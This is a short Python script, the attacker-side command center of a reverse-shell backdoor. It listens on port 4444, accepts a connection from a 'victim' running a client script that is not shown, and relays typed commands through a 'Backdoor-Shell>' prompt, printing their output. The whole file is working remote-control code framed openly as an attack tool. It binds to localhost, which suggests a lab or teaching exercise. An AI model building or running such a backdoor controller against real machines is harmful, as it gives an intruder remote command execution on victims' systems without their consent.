import socket

def start_attacker_server():

    # define the IP and Port to Listen on (127.0.0.1)

    host = "127.0.0.1"
    port = 4444

    # create a TCP socket

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # bind the socket to the host and port

    server.bind((host, port))

    # start listening for incoming connections from the victim (maximum 1 queued connection)

    server.listen(1)
    print(f"--- Attacker Command Center Started ---")
    print(f"Listening for victim connection on {host}:{port}...")

    # accept the connection when the victim runs the client script

    victim_socket, victim_adress = server.accept()
    print(f"[+] Connection established with victim. IP: {victim_adress[0]}") 
    print("Type 'exit' to terminate the session. \n")

    while True:
        # get the command to execute from the attacker's keyboard
        command = input("Backdoor-Shell> ")

        if not command.strip():
            continue
        
        # send the command to the victim (must be encoded to bytes)
        victim_socket.send(command.encode())

        # if the attacker wants to close the connection
        if command.lower() == 'exit':
            print("Closing Connection. Command center shut down.")
            break

        # receive the result/output of the command from the victim
        # buffer size set to 4096 bytes for larger text outputs
        response = victim_socket.recv(4096).decode()
        print(response)

    victim_socket.close()
    server.close()

if __name__ == "__main__":
    start_attacker_server()

